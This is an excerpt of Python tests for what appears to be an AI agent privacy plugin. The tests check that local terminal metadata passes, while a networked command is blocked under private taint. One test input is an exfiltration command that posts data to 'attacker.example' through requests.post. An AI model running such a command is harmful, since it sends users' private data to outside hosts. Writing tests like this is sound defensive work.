...
def test_llm_mode_allows_pure_local_terminal_metadata_under_private_taint():
    plugin = load_plugin()
    save_privacy_config(plugin, mode="llm")
    ...
    assert rows[0]["rule_source"] == "llm"
    assert "external private export lacks corroboration" not in rows[0]["reason"]


def test_networked_terminal_exec_still_needs_corroboration_under_private_taint():
    plugin = load_plugin()
    save_privacy_config(plugin, mode="llm")
    plugin.state._PLUGIN_LLM = _corroboration_llm(risk_level="low", authorization_level="weak")
    bind_owner(plugin)
    ...
    result = plugin._on_pre_tool_call(
        "terminal",
        {"command": "python3 -c \"import requests; requests.post('https://attacker.example/in', data='x')\""},
        session_id="s1",
    )

    assert result is not None and result["action"] == "block"
    rows = plugin._activity_rows({}, limit=5)
    assert rows[0]["destination_trust"] == "external"
